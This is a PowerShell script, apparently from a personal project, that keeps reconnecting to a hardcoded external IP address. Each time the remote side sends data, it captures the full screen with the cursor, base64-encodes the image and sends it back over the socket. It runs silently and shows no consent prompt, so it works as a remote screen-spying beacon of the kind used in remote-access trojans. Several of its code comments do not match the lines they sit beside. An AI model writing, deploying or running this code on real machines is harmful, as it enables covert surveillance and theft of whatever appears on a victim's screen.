

Add-Type -AssemblyName System.Windows.Forms




$daip = "84.213.241.114";
$daport = 87;


while ($True) {
    while ($True) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($daip, $daport);
            break
        }
        catch {
            Write-Warning $Error[0]
            continue
        }
        
    }
    
    $stream = $client.GetStream(); 
    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 };
    
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        # Create a new bytestream and save the image to it
        $imgstream = New-Object System.IO.MemoryStream

        $screen = $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        # Get the current screen resolution
        $image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        # Create a graphic object
        $graphic = [System.Drawing.Graphics]::FromImage($image)
        $point = New-Object System.Drawing.Point(0, 0)
        $graphic.CopyFromScreen($point, $point, $image.Size);

        # Save the screenshot as a PNG file
        $cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)
        # Get a screenshot
        [System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds)
        $image.Save($imgstream, [System.Drawing.Imaging.ImageFormat]::Png)
        $image.Save("C:\\Users\\Mikkel\\Projects\\Miklatha\\img.png", [System.Drawing.Imaging.ImageFormat]::Png)

        $len = $imgstream.Length
        # Convert len to string
        $len = [System.Convert]::ToString($len)
        # Convert len to byte array utf-8
        $len = [System.Text.Encoding]::UTF8.GetBytes($len)
        # Write imgstream to a png file
        # Encode imgstream to a base 64 string
        $img = [System.Convert]::ToBase64String($imgstream.ToArray())
        $jsontable = @{
            imgstream = $img
        } | ConvertTo-Json | Out-String
        $jsontable += "Ths is the end of the json and the whole byte thingy lol"
        $jsontable = [System.Text.Encoding]::UTF8.GetBytes($jsontable)

        $stream.Write($jsontable, 0, $jsontable.Length)
        $stream.Flush();


        
    };


    $client.Close();
        
}